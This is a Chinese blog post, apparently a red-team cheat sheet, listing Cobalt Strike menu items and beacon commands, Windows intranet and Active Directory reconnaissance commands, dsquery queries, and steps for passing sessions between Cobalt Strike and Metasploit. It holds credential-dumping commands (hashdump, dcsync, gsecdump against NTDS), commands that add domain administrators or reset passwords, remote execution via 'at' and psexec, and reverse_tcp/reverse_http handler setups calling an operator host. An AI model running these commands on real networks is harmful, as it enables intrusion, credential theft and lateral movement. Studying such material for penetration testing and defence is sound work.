<!DOCTYPE html>
<html lang="zh-CN">





<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#4a4770">
  <meta name="description" content="">
  <meta name="author" content="">
  <meta name="keywords" content="">
  <title>cobalt strike内网渗透常用命令 | Cheekkk&#39;s Anti-Gravity Galaxy</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/atelier-forest-light.min.css" />


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_fmb4a04yx8h.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">




<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


<meta name="generator" content="Hexo 4.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Cheekkk's Anti-Gravity Galaxy</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">
              <i class="iconfont icon-home-fill"></i>
              首页</a>
          </li>
        
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">
              <i class="iconfont icon-tags-fill"></i>
              标签</a>
          </li>
        
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">
              <i class="iconfont icon-user-fill"></i>
              关于</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/img/bg.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              

              <div class="mt-1">
                
                  
                  <span class="post-meta mr-2">
                    <i class="iconfont icon-chart"></i>
                    2.8k 字
                  </span>
                

                
                  
                  <span class="post-meta mr-2">
                      <i class="iconfont icon-clock-fill"></i>
                    
                    
                    18
                     分钟
                  </span>
                

                
              </div>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <div class="post-content mx-auto" id="post">
            
            <article class="markdown-body">
              <p>域渗透、内网渗透的一些命令</p>
<a id="more"></a>

<h1 id="cobalt-strike内网渗透常用命令"><a href="#cobalt-strike内网渗透常用命令" class="headerlink" title="cobalt strike内网渗透常用命令"></a>cobalt strike内网渗透常用命令</h1><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf" target="_blank" rel="noopener">官方手册</a></p>
<h2 id="00-菜单功能"><a href="#00-菜单功能" class="headerlink" title="00 菜单功能"></a>00 菜单功能</h2><ul>
<li><p>cobalt strike</p>
<ul>
<li>New Connection  新的链接</li>
<li>Preferences 偏好设置</li>
<li>Visualization  窗口视图模式</li>
<li>VPN interfaces  VPN接入</li>
<li>Listeners  监听器</li>
<li>Sript Manager  脚本管理</li>
<li>Close 退出</li>
</ul>
</li>
<li><p>View：</p>
<ul>
<li>Applications 用于显示 System Profiler 获取的目标浏览器，操作系统，flash版本</li>
<li>Credentials 显示所有已经获取的用户主机hash</li>
<li>Downloads 显示下载的文件</li>
<li>Event log 事件日志 记录团队  目标上线等记录</li>
<li>Keystrokes 目标键盘记录</li>
<li>Proxy Pivots 代理信息</li>
<li>Screenshots 屏幕截图</li>
<li>Script Console 加载自定义脚本</li>
<li>Targets 显示所有主机</li>
<li>Web log web服务日志</li>
</ul>
</li>
<li><p>Attack：</p>
<ul>
<li>Packages<ul>
<li>HTML Application 生成hta文件</li>
<li>MS Office Macro  宏office文件</li>
<li>Payload Generator  生成各种语言版本的payload</li>
<li>USB/CD AutoPlay 利用自动播放运行的被控端文件</li>
<li>Windows Dropper 捆绑器可将任意正常的文件</li>
<li>Windows Executable payload生成可执行文件 (一般使用这个)</li>
<li>Windows Executable (S)  把包含payload,Stageless生成可执行文件(包含多数功能)</li>
</ul>
</li>
<li>Web Drive-by：<ul>
<li>Manage  开启的所有web服务</li>
<li>Clone Site 克隆网站 </li>
<li>Host File 提供Web以供下载某文件</li>
<li>Scripted Web Delivery  为payload提供web服务以便于下载和执行</li>
<li>Signed Applet Attack  启动一个Web服务以提供自签名Java Applet的运行环境</li>
<li>Smart Applet Attack  自动检测Java版本并l利用已知的exploits绕过security</li>
<li>System Profiler 获取系统，Flash，浏览器版本等</li>
</ul>
</li>
</ul>
</li>
<li><p>spear phishing 鱼叉式网络钓鱼</p>
</li>
<li><p>Reporting：</p>
<ul>
<li>Activity report  活动报告</li>
<li>Hosts report  主机报告</li>
<li>Indicators of Compromise 威胁报告</li>
<li>Sessions report  会话报告</li>
<li>Social engineering report  社会工程学报告</li>
</ul>
</li>
</ul>
<h2 id="01-右键功能"><a href="#01-右键功能" class="headerlink" title="01 右键功能"></a>01 右键功能</h2><ul>
<li><p>Interact 打开beacon</p>
</li>
<li><p>Access </p>
<ul>
<li>dump hashes 获取hash</li>
<li>Elevate  提权</li>
<li>Golden Ticket 生成黄金票据注入当前会话</li>
<li>MAke token  凭证转换</li>
<li>Run Mimikatz 运行 Mimikatz </li>
<li>Spawn As 用其他用户生成Cobalt Strike侦听器</li>
</ul>
</li>
<li><p>Explore</p>
<ul>
<li>Browser Pivot 劫持目标浏览器进程</li>
<li>Desktop(VNC)  桌面交互</li>
<li>File Browser  文件浏览器</li>
<li>Net View 命令Net View</li>
<li>Port scan 端口扫描</li>
<li>Process list 进程列表</li>
<li>Screenshot 截图</li>
</ul>
</li>
<li><p>Pivoting</p>
<ul>
<li><p>SOCKS Server 代理服务</p>
</li>
<li><p>Listener  反向端口转发</p>
</li>
<li><p>Deploy VPN 部署VPN</p>
</li>
</ul>
</li>
<li><p>Spawn  新的通讯模式并生成会话</p>
</li>
<li><p>Session 会话管理，删除，心跳时间，退出，备注</p>
</li>
</ul>
<h2 id="02-beacon命令"><a href="#02-beacon命令" class="headerlink" title="02 beacon命令"></a>02 beacon命令</h2><ul>
<li><p>argue            进程参数欺骗</p>
</li>
<li><p>browserpivot        注入受害者浏览器进程</p>
</li>
<li><p>bypassuac         绕过UAC</p>
</li>
<li><p>cancel           取消正在进行的下载</p>
</li>
<li><p>cd             切换目录</p>
</li>
<li><p>checkin          强制让被控端回连一次</p>
</li>
<li><p>clear           清除beacon内部的任务队列</p>
</li>
<li><p>connect          Connect to a Beacon peerover TCP</p>
</li>
<li><p>covertvpn         部署Covert VPN客户端</p>
</li>
<li><p>cp             复制文件</p>
</li>
<li><p>dcsync           从DC中提取密码哈希</p>
</li>
<li><p>desktop          远程VNC</p>
</li>
<li><p>dllinject         反射DLL注入进程</p>
</li>
<li><p>dllload          使用LoadLibrary将DLL加载到进程中</p>
</li>
<li><p>download          下载文件</p>
</li>
<li><p>downloads         列出正在进行的文件下载</p>
</li>
<li><p>drives           列出目标盘符</p>
</li>
<li><p>elevate          尝试提权</p>
</li>
<li><p>execute          在目标上执行程序(无输出)</p>
</li>
<li><p>execute-assembly      在目标上内存中执行本地.NET程序</p>
</li>
<li><p>exit            退出beacon</p>
</li>
<li><p>getprivs          Enable system privileges oncurrent token</p>
</li>
<li><p>getsystem         尝试获取SYSTEM权限</p>
</li>
<li><p>getuid           获取用户ID</p>
</li>
<li><p>hashdump          转储密码哈希值</p>
</li>
<li><p>help            帮助</p>
</li>
<li><p>inject           在特定进程中生成会话</p>
</li>
<li><p>jobkill          杀死一个后台任务</p>
</li>
<li><p>jobs            列出后台任务</p>
</li>
<li><p>kerberos_ccache_use    从ccache文件中导入票据应用于此会话</p>
</li>
<li><p>kerberos_ticket_purge   清除当前会话的票据</p>
</li>
<li><p>kerberos_ticket_use    从ticket文件中导入票据应用于此会话</p>
</li>
<li><p>keylogger         键盘记录</p>
</li>
<li><p>kill            结束进程</p>
</li>
<li><p>link            Connect to a Beacon peerover a named pipe</p>
</li>
<li><p>logonpasswords       使用mimikatz转储凭据和哈希值</p>
</li>
<li><p>ls             列出文件</p>
</li>
<li><p>make_token         创建令牌以传递凭据</p>
</li>
<li><p>mimikatz          运行mimikatz</p>
</li>
<li><p>mkdir           创建一个目录</p>
</li>
<li><p>mode dns          使用DNS A作为通信通道(仅限DNS beacon)</p>
</li>
<li><p>mode dns-txt        使用DNS TXT作为通信通道(仅限D beacon)</p>
</li>
<li><p>mode dns6         使用DNS AAAA作为通信通道(仅限DNS beacon)</p>
</li>
<li><p>mode http         使用HTTP作为通信通道</p>
</li>
<li><p>mv             移动文件</p>
</li>
<li><p>net            net命令</p>
</li>
<li><p>note            备注    </p>
</li>
<li><p>portscan          进行端口扫描</p>
</li>
<li><p>powerpick         通过Unmanaged PowerShell执行命令</p>
</li>
<li><p>powershell         通过powershell.exe执行命令</p>
</li>
<li><p>powershell-import     导入powershell脚本</p>
</li>
<li><p>ppid            Set parent PID forspawned post-ex jobs</p>
</li>
<li><p>ps             显示进程列表</p>
</li>
<li><p>psexec           Use a service to spawn asession on a host</p>
</li>
<li><p>psexec_psh         Use PowerShell to spawn asession on a host</p>
</li>
<li><p>psinject          在特定进程中执行PowerShell命令</p>
</li>
<li><p>pth            使用Mimikatz进行传递哈希</p>
</li>
<li><p>pwd            当前目录位置</p>
</li>
<li><p>reg            Query the registry</p>
</li>
<li><p>rev2self          恢复原始令牌</p>
</li>
<li><p>rm             删除文件或文件夹</p>
</li>
<li><p>rportfwd          端口转发</p>
</li>
<li><p>run            在目标上执行程序(返回输出)</p>
</li>
<li><p>runas           以另一个用户权限执行程序</p>
</li>
<li><p>runasadmin         在高权限下执行程序</p>
</li>
<li><p>runu            Execute a program underanother PID</p>
</li>
<li><p>screenshot         屏幕截图</p>
</li>
<li><p>setenv           设置环境变量</p>
</li>
<li><p>shell           cmd执行命令</p>
</li>
<li><p>shinject          将shellcode注入进程</p>
</li>
<li><p>shspawn          生成进程并将shellcode注入其中</p>
</li>
<li><p>sleep           设置睡眠延迟时间</p>
</li>
<li><p>socks           启动SOCKS4代理</p>
</li>
<li><p>socks stop         停止SOCKS4</p>
</li>
<li><p>spawn           Spawn a session</p>
</li>
<li><p>spawnas          Spawn a session as anotheruser</p>
</li>
<li><p>spawnto          Set executable tospawn processes into</p>
</li>
<li><p>spawnu           Spawn a session underanother PID</p>
</li>
<li><p>ssh            使用ssh连接远程主机</p>
</li>
<li><p>ssh-key          使用密钥连接远程主机</p>
</li>
<li><p>steal_token        从进程中窃取令牌</p>
</li>
<li><p>timestomp         将一个文件时间戳应用到另一个文件</p>
</li>
<li><p>unlink           Disconnect from parentBeacon</p>
</li>
<li><p>upload           上传文件</p>
</li>
<li><p>wdigest          使用mimikatz转储明文凭据</p>
</li>
<li><p>winrm           使用WinRM在主机上生成会话</p>
</li>
<li><p>wmi            使用WMI在主机上生成会话</p>
</li>
</ul>
<h2 id="03-内网渗透常用命令"><a href="#03-内网渗透常用命令" class="headerlink" title="03 内网渗透常用命令"></a>03 内网渗透常用命令</h2><p><a href="https://www.t00ls.net/articles-39285.html" target="_blank" rel="noopener">参考</a></p>
<ul>
<li><p>ipconfig/all  //查看IP地址</p>
</li>
<li><p>ipconfig /release //释放地址</p>
</li>
<li><p>ipconfig /renew 重新获取Ip地址</p>
</li>
<li><p>whoami  //查询账号所属权限</p>
</li>
<li><p>whoami/all //查看sid值</p>
</li>
<li><p>systeminfo //查询系统以及补丁信息</p>
</li>
<li><p>tasklist /svc  //查看进程</p>
</li>
<li><p>taskkill /im 进程名称(cmd) //结束进程</p>
</li>
<li><p>taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)</p>
</li>
<li><p>wmic qfe get hotfixid  //查看已安装过得补丁，这个很实用</p>
</li>
<li><p>wmic qfe list full /format:htable &gt; hotfixes.htm //详细的补丁安装</p>
</li>
<li><p>wmic qfe    //查询补丁信息以及微软提供的下载地址</p>
</li>
<li><p>ping hostname(主机名）  //显示该机器名的IP</p>
</li>
<li><p>net start  //查看当前运行的服务</p>
</li>
<li><p>net user    //查看本地组的用户</p>
</li>
<li><p>net localgroup administrators  //查看本机管理员组有哪些用户</p>
</li>
<li><p>net use    //查看会话</p>
</li>
<li><p>net session   //查看当前会话</p>
</li>
<li><p>net share    //查看SMB指向的路径[即共享]</p>
</li>
<li><p>wmic share get name,path  //查看SMB指向的路径</p>
</li>
<li><p>wmic nteventlog get path,filename,writeable //查询系统日志文件存储位置</p>
</li>
<li><p>net use \IP\ipc$ password /user:username    //建立IPC会话（工作组模式）</p>
</li>
<li><p>net use z: \192.168.1.1    //建立映射到本机Z盘</p>
</li>
<li><p>net time \172.16.16.2     //查询共享主机的是</p>
</li>
<li><p>at \172.16.16.2 13:50 c:\windows\2009.exe    //在共享主机上执行</p>
</li>
<li><p>netstat -ano    //查看开放的端口</p>
</li>
<li><p>netstat -an | find “3389”  //找到3389端口</p>
</li>
<li><p>net accounts    //查看本地密码策略</p>
</li>
<li><p>nbtstat –A ip    //netbiso查询</p>
</li>
<li><p>net view    //查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来</p>
</li>
<li><p>echo %PROCESSOR_ARCHITECTURE%     //查看系统是32还是64位 </p>
</li>
<li><p>set                    //查看系统环境设置变量</p>
</li>
<li><p>net start              //查看当前运行的服务</p>
</li>
<li><p>wmic service list brief        //查看进程服务</p>
</li>
<li><p>wmic process list brief      //查看进程</p>
</li>
<li><p>wmic startup list brief    //查看启动程序信息</p>
</li>
<li><p>wmic product list brief       //查看安装程序和版本信息（漏洞利用线索）</p>
</li>
<li><p>wmic startup list full      //识别开机启动的程序</p>
</li>
<li><p>wmic process where(description=”mysqld.exe”) &gt;&gt;mysql.log //获取软件安装路径</p>
</li>
</ul>
<h2 id="04-域渗透常用命令"><a href="#04-域渗透常用命令" class="headerlink" title="04 域渗透常用命令"></a>04 域渗透常用命令</h2><ul>
<li><p>net group /domain               //获得所有域用户组列表</p>
</li>
<li><p>net group qq_group /domain         //显示域中qq_group组的成员</p>
</li>
<li><p>net group qq_group /del /domain      //删除域中qq_group组</p>
</li>
<li><p>net group qq_group qq /del /domain    //删除域内qq_group 群组中的成员QQ</p>
</li>
<li><p>net group qq_group /add /domain      //增加域中的群组</p>
</li>
<li><p>net group “domain admins” /domain    //获得域管理员列表</p>
</li>
<li><p>net group “enterprise admins” /domain  //获得企业管理员列表</p>
</li>
<li><p>net localgroup administrators /domain  //获取域内置administrators组用（enterprise admins、domain admins）</p>
</li>
<li><p>net group “domain controllers” /domain  //获得域控制器列表</p>
</li>
<li><p>net group “domain computers” /domain  //获得所有域成员计算机列表</p>
</li>
<li><p>net user /domain               //获得所有域用户列表</p>
</li>
<li><p>net user someuser /domain         //获得指定账户someuser的详细信息</p>
</li>
<li><p>net accounts /domain          //获得域密码策略设置，密码长短，错误锁定等信息</p>
</li>
<li><p>net view /domain            //查询有几个域, 查询域列表</p>
</li>
<li><p>net view /domain:testdomain    //查看 testdomain域中的计算机列表</p>
</li>
<li><p>nltest /domain_trusts        //获取域信任信息</p>
</li>
<li><p>net user domain-admin /domain   //查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息</p>
</li>
<li><p>net config Workstation      //查询机器属于哪个域</p>
</li>
<li><p>net time /domian          //查询主域服务器的时间</p>
</li>
<li><p>echo %logonserver%         //查看登陆到这台服务器的计算机名</p>
</li>
<li><p>net time \192.168.1.1      //查询远程共享主机192.168.1.1的时间</p>
</li>
<li><p>net use \IP\ipc$ password /user:username@domain   //ipc$域内连接</p>
</li>
<li><p>net view \dc2.backlion.com      //查看域控共享情况</p>
</li>
<li><p>dir \dc2.backlion.com\SYSVOL /s /a &gt; sysvol.txt //列出sysvol日志记录</p>
</li>
<li><p>xcopy \dc2.backlion.com\sysvol.txt sysvol.txt /i /e /c//远程拷贝到本地sysvol日志</p>
</li>
<li><p>net user /domain bk bk123           //修改域内用户密码，需要管理员权限</p>
</li>
<li><p>net localgroup administartors  SEZKL\backlion /add   //将SEZKL域中的用户backlion添加到administrators组中</p>
</li>
<li><p>mstsc /admin           //远程桌面登录到console会话解决hash无法抓出问题</p>
</li>
<li><p>gpupdate/force            //更新域策略</p>
</li>
<li><p>psexec \192.168.1.3 -u administrator -p bk1234 -c gsecdump.exe -u</p>
<p>//从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来</p>
</li>
<li><p>gsecdump -a     //获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值</p>
</li>
<li><p>tasklist /S ip /U domain\username /P /V  //查看远程计算机进程列</p>
</li>
</ul>
<h2 id="05-dsquery的AD查询工具"><a href="#05-dsquery的AD查询工具" class="headerlink" title="05 dsquery的AD查询工具"></a>05 dsquery的AD查询工具</h2><ul>
<li><p>dsquery user domainroot -limit 65535 &amp;&amp; net user /domain  //列出该域内所有用户名</p>
</li>
<li><p>dsquery server -domain super.com | dsget server -dnsname -site  //搜索域内所有域控制器并显示他们的DNS主机名和站点名称</p>
</li>
<li><p>dsquery contact  //寻找目录中的联系人</p>
</li>
<li><p>dsquery subnet   //列出该域内网段划分</p>
</li>
<li><p>query user        //查询那些用户在线</p>
</li>
<li><p>dsquery group &amp;&amp; net group /domain   //列出该域内分组</p>
</li>
<li><p>dsquery ou                   //列出该域内组织单位</p>
</li>
<li><p>dsquery server &amp;&amp; net time /domain    //列出该域内域控制器</p>
</li>
<li><p>dsquery site -o rdn           //搜索域中所有站点的名称</p>
</li>
<li><p>dsquery group dc=super,dc=com |more  //搜索在DC=SUPER,DC=COM 域中的所有组</p>
</li>
<li><p>psloggedon.exe                //查询那台主机和用户登录到该主机上</p>
</li>
<li><p>netsess.exe  //192.168.1.115      //远程主机上无需管理员权限,查询到主机名和用户</p>
</li>
<li><p>reg query “HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT” //获取最近mstsc登录的记录</p>
</li>
</ul>
<h2 id="06-CS与MSF互转"><a href="#06-CS与MSF互转" class="headerlink" title="06 CS与MSF互转"></a>06 CS与MSF互转</h2><ul>
<li><p>CS到MSF</p>
<ul>
<li><p>在CS中获取一个beacon</p>
</li>
<li><p>在msf中设置监听</p>
<pre><code class="hljs gams">use exploit/multi/handler
<span class="hljs-keyword">set</span> padyload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>
<span class="hljs-keyword">set</span> <span class="hljs-comment">lhost xx.xx.xx.xx</span>
<span class="hljs-keyword">set</span> <span class="hljs-comment">lport 1234</span>
run</code></pre>
</li>
<li><p>在CS中设置一个监听器</p>
<p>windows/foreign/reverse_tcp Listener</p>
<p>其中ip为msf的ip地址，端口为msf所监听的端口</p>
</li>
<li><p>右键spawn，选择刚才设置的监听器即可</p>
</li>
</ul>
</li>
<li><p>MSF到CS</p>
<ul>
<li><p>在MSF中获取一个Meterpreter</p>
</li>
<li><p>在CS中设置一个监听</p>
</li>
<li><p>在MSF中进行注入，注意payload要与CS监听使用的payload一致</p>
<pre><code class="hljs routeros">msf exploit(handler) &gt;  use exploit/windows/local/payload_inject 
msf exploit(payload_inject) &gt;  <span class="hljs-builtin-name">set</span> PAYLOAD windows/meterpreter/reverse_http 
msf exploit(payload_inject) &gt; <span class="hljs-builtin-name">set</span> DisablePayloadHandler <span class="hljs-literal">true</span> 
msf exploit(payload_inject) &gt; <span class="hljs-builtin-name">set</span> LHOST xx.xx.xx.xx 
msf exploit(payload_inject) &gt; <span class="hljs-builtin-name">set</span> LPORT 1234
msf exploit(payload_inject) &gt; <span class="hljs-builtin-name">set</span> SESSION 1 
msf exploit(payload_inject) &gt; exploit</code></pre>
</li>
<li><p>主机上线</p>
</li>
</ul>
</li>
</ul>
<h2 id="07-键盘快捷键"><a href="#07-键盘快捷键" class="headerlink" title="07 键盘快捷键"></a>07 键盘快捷键</h2><p>摘自<a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf" target="_blank" rel="noopener">官方文档</a></p>
<p><img src="1.png" srcset="/img/loading.gif" alt=""></p>

            </article>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
                    
                      <a class="hover-with-bg" href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-6">
                    
                    
                      <a href="/IPC%E8%BF%9E%E6%8E%A5%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">IPC连接常用命令</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-6">
                    
                    
                      <a href="/%E4%BD%BF%E7%94%A8jenv%E7%AE%A1%E7%90%86JDK%E7%89%88%E6%9C%AC/">
                        <span class="hidden-mobile">使用jenv管理JDK版本</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

            
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/main.js" ></script>


  <script  src="/js/lazyload.js" ></script>



  
  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 1,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>





  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>






<!-- Plugins -->



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "cobalt strike内网渗透常用命令&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 40,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>


















<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/assets/hibiki.model.json"},"display":{"position":"right","width":200,"height":400,"hOffset":0,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false});</script></body>
</html>
